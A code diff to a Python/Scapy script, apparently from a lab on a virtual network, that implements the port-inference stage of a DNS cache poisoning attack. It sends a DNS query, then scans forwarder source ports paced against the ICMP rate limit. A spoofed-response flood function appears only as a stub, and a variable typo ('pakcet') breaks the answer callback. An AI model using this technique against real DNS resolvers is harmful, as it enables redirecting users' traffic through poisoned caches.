@@ -46,6 +46,7 @@ ICMP_limit_rate = 50
 ICMP_recovering_time = .02
 
 finished = 0
+got_answer = 0
 
 global_socket = conf.L3socket(iface='vboxnet2')
 
@@ -115,7 +116,16 @@ class Logger(object):
     def flush(self):
         pass
 
-def step1(thread_id):
+def answer_callback(packet):
+    print("<<<<<<<<<<<<<<<<<<answer found.>>>>>>>>>>>>>>>>>>>>>>")
+    print(pakcet.show())
+    global got_answer
+    got_answer = 1
+
+def step1():
+
+    global got_answer
+    got_answer = 0
 
     my_ip = '192.168.58.1'
     my_port = 9554
@@ -124,41 +134,11 @@ def step1(thread_id):
     udp_layer = UDP(dport=forwarder_port, sport=my_port)
     dns_layer = DNS(rd=1, qd=DNSQR(qname=domain_name))
 
-    packet = ip_layer / udp_layer / dns_layer
-
-    lock.acquire()
-    
-    ret = sr1(packet, verbose=True)
-    
-    '''
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    #sock.connect((forwarder_ip, forwarder_port))
-    #sock.setblocking(False)
-    #sock.bind((my_ip, my_port))
-    sock.sendto(bytes(repr(str(packet)), 'utf-8'), (forwarder_ip, forwarder_port))
-    #send(packet, verbose=True)
-
-    sock.bind((my_ip, my_port)) #local ip, local port
-
-    #t = AsyncSniffer(opened_socket=sock)
-
-    try:
-        reply, address = sock.recvfrom(512)
-        print (reply.show())
-    except socket.error as e:
-        print ("socket error")
-    except OSError as e:
-        print ("OS error")
+    packet = Ether() / ip_layer / udp_layer / dns_layer
         
-    sock.close()
-    '''
+    #ret = sr1(packet, verbose=True)
+    global_socket.send(packet)
 
-
-    lock.release()
-
-    
-
-    #print (ret.show())
     return
 
 # We are going to use this for infering the actual source port also,
@@ -277,18 +257,12 @@ def find_the_exact_port(start_port, number_of_ports):
 def flood_the_port_with_spoofed_dns_response(actual_port):
     None
 
-def step2(thread_id, source_port_range_start, source_port_range_end):
+def step2(source_port_range_start, source_port_range_end):
     #need to run this file with sudo because of port 53
-
-    #print("thread id: " + str(thread_id))
-
-    # Wait for the thread 1 to send the dns query first (aka, acruire the lock)
-    while lock.locked() == False:
-        None
     
     start = source_port_range_start
 
-    while lock.locked() and start + ICMP_limit_rate <= source_port_range_end:
+    while got_answer == False and start + ICMP_limit_rate <= source_port_range_end:
         #print("lock status: " + str(lock.locked()))
 
         #for system wide time count + sleep also
@@ -336,21 +310,24 @@ def main():
     
     iteration = 1
 
+
+    t = AsyncSniffer(iface="vboxnet2",
+        filter="dst port 9554 and udp", prn=answer_callback)
+
+    t.start()
+
     while finished == 0:
 
         print ("----------Iteration " + str(iteration) + " is starting.----------")
 
-        t1 = threading.Thread(target=step1, args=(2 * iteration - 1, ))
-        t1.start()
-        t2 = threading.Thread(target=step2, args=(2 * iteration, 32768, 60999))
-        t2.start()
+        step1()
+        step2(32768, 60999)
 
-        t1.join()
-        t2.join()
-        
-        print ("----------Iteration " + str(iteration) + " is completed.----------")
+        print ("----------Iteration " + str(iteration) + " is completed.----------\n")
 
         iteration += 1
+
+    t.stop()
 
 if __name__ == "__main__":
     main()
